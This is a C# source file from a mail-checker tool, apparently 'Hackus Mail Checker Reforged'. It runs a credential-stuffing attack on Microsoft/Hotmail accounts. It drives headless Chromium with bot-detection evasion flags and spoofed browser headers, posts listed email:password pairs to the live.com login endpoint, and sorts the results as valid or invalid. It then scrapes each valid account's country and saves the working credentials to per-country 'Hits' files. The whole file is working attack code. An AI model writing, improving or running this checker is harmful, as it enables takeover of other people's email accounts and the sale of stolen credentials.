using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using Hackus_Mail_Checker_Reforged.Models;
using Hackus_Mail_Checker_Reforged.Models.Enums;
using Hackus_Mail_Checker_Reforged.Services.Managers;
using Hackus_Mail_Checker_Reforged.Services.Settings;
using Microsoft.Playwright;

namespace Hackus_Mail_Checker_Reforged.Net.Web
{
    /// <summary>
    /// Hotmail V2 - Web API (Desktop Browser)
    /// Extracts country from: account.microsoft.com
    /// </summary>
    internal class HotmailClientV2
    {
        private Mailbox _mailbox;
        private static IPlaywright _playwright;
        private static IBrowser _browser;
        private static bool _isInitialized = false;
        private static readonly SemaphoreSlim _initSemaphore = new SemaphoreSlim(1, 1);

        public HotmailClientV2(Mailbox mailbox)
        {
            this._mailbox = mailbox;
        }

        public static async Task InitializeAsync()
        {
            if (_isInitialized) return;

            await _initSemaphore.WaitAsync();
            try
            {
                if (_isInitialized) return;

                // Auto-install Playwright browsers if not already installed
                try
                {
                    var exitCode = Microsoft.Playwright.Program.Main(new[] { "install", "chromium", "--with-deps" });
                    if (exitCode != 0)
                    {
                        System.Diagnostics.Debug.WriteLine("Warning: Playwright browser installation returned non-zero exit code");
                    }
                }
                catch (Exception ex)
                {
                    System.Diagnostics.Debug.WriteLine($"Warning: Could not auto-install Playwright browsers: {ex.Message}");
                    // Continue anyway - browsers might already be installed
                }

                _playwright = await Playwright.CreateAsync();
                _browser = await _playwright.Chromium.LaunchAsync(new BrowserTypeLaunchOptions
                {
                    Headless = true,
                    Args = new[]
                    {
                        "--disable-blink-features=AutomationControlled",
                        "--disable-dev-shm-usage",
                        "--no-sandbox"
                    }
                });

                _isInitialized = true;
            }
            finally
            {
                _initSemaphore.Release();
            }
        }

        ~HotmailClientV2()
        {
            try
            {
                DisposeAsync().GetAwaiter().GetResult();
            }
            catch
            {
                // Suppress exceptions in finalizer
            }
        }

        public OperationResult Handle()
        {
            if (this._mailbox?.Address == null)
                return OperationResult.Error;

            var result = LoginAsync().GetAwaiter().GetResult();

            StatisticsManager.Instance.Increment(result);
            FileManager.SaveStatistics(this._mailbox.Address, this._mailbox.Password, result);

            if (result == OperationResult.Ok && !SearchSettings.Instance.Search)
            {
                MailManager.Instance.AddResult(new MailboxResult(this._mailbox));
            }

            return result;
        }

        private async Task<OperationResult> LoginAsync()
        {
            if (!_isInitialized)
                await InitializeAsync();

            var context = await _browser.NewContextAsync(new BrowserNewContextOptions
            {
                UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0",
                ViewportSize = new ViewportSize { Width = 1920, Height = 1080 },
                ExtraHTTPHeaders = new Dictionary<string, string>
                {
                    { "sec-ch-ua", "\"Microsoft Edge\";v=\"125\", \"Chromium\";v=\"125\", \"Not.A/Brand\";v=\"24\"" },
                    { "sec-ch-ua-mobile", "?0" },
                    { "sec-ch-ua-platform", "\"Windows\"" },
                    { "X-Edge-Shopping-Flag", "1" }
                }
            });

            var page = await context.NewPageAsync();

            try
            {
                // Step 1: POST to login endpoint
                string postUrl = "https://login.live.com/ppsecure/post.srf?" +
                    "client_id=0000000048170EF2&" +
                    "redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf&" +
                    "response_type=token&" +
                    "scope=service%3A%3Aoutlook.office.com%3A%3AMBI_SSL&" +
                    "display=touch";

                var response = await context.APIRequest.PostAsync(postUrl, new APIRequestContextOptions
                {
                    Headers = new Dictionary<string, string>
                    {
                        { "Content-Type", "application/x-www-form-urlencoded" },
                        { "Origin", "https://login.live.com" },
                        { "Referer", "https://login.live.com/" }
                    },
                    DataObject = new Dictionary<string, string>
                    {
                        { "login", _mailbox.Address },
                        { "loginfmt", _mailbox.Address },
                        { "passwd", _mailbox.Password },
                        { "i13", "1" },
                        { "type", "11" },
                        { "LoginOptions", "1" },
                        { "ps", "2" }
                    }
                });

                var responseText = await response.TextAsync();
                var finalUrl = response.Url;

                // Step 2: Check if success
                if (responseText.Contains("Your account or password is incorrect") ||
                    responseText.Contains("That Microsoft account doesn't exist"))
                {
                    await context.CloseAsync();
                    return OperationResult.Bad;
                }

                if (responseText.Contains("/Abuse?mkt=") || finalUrl.Contains("finisherror"))
                {
                    await context.CloseAsync();
                    return OperationResult.Error;
                }

                var cookies = await context.CookiesAsync();
                bool hasAuthCookies = cookies.Any(c => c.Name == "ANON" || c.Name == "WLSSC");

                if (!hasAuthCookies && !finalUrl.Contains("oauth20_desktop.srf"))
                {
                    await context.CloseAsync();
                    return OperationResult.Bad;
                }

                // Step 3: Navigate to account page to get country
                await page.GotoAsync(
                    "https://account.microsoft.com/?lang=en-US&refd=account.live.com&refp=landing&mkt=EN-US",
                    new PageGotoOptions { WaitUntil = WaitUntilState.NetworkIdle }
                );

                var accountContent = await page.ContentAsync();
                var countryMatch = Regex.Match(accountContent, "\"countryCode\"\\s*:\\s*\"([^\"]+)\"");

                string country = countryMatch.Success ? countryMatch.Groups[1].Value : "Unknown";

                // Step 4: Save to country-specific file
                SaveToHits(country, _mailbox.Address, _mailbox.Password);

                await context.CloseAsync();
                return OperationResult.Ok;
            }
            catch (Exception ex)
            {
                System.Diagnostics.Debug.WriteLine($"[HotmailClientV2] Login error: {ex.Message}");
                await context.CloseAsync();
                return OperationResult.Error;
            }
        }

        private void SaveToHits(string country, string email, string password)
        {
            try
            {
                string hitsDir = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "Hits", "Hotmail");
                Directory.CreateDirectory(hitsDir);

                string fileName = $"{SanitizeFileName(country)}.txt";
                string filePath = Path.Combine(hitsDir, fileName);

                File.AppendAllText(filePath, $"{email}:{password}\n");
            }
            catch (Exception ex)
            {
                System.Diagnostics.Debug.WriteLine($"[HotmailClientV2] Failed to save hits: {ex.Message}");
            }
        }

        private string SanitizeFileName(string fileName)
        {
            foreach (char c in Path.GetInvalidFileNameChars())
            {
                fileName = fileName.Replace(c, '_');
            }
            return fileName;
        }

        public static async Task DisposeAsync()
        {
            if (!_isInitialized) return;

            try
            {
                if (_browser != null)
                {
                    await _browser.CloseAsync();
                    await _browser.DisposeAsync();
                    _browser = null;
                }

                if (_playwright != null)
                {
                    _playwright.Dispose();
                    _playwright = null;
                }
            }
            catch (Exception ex)
            {
                System.Diagnostics.Debug.WriteLine($"Error disposing Playwright resources: {ex.Message}");
            }
            finally
            {
                _isInitialized = false;
            }
        }
    }
}
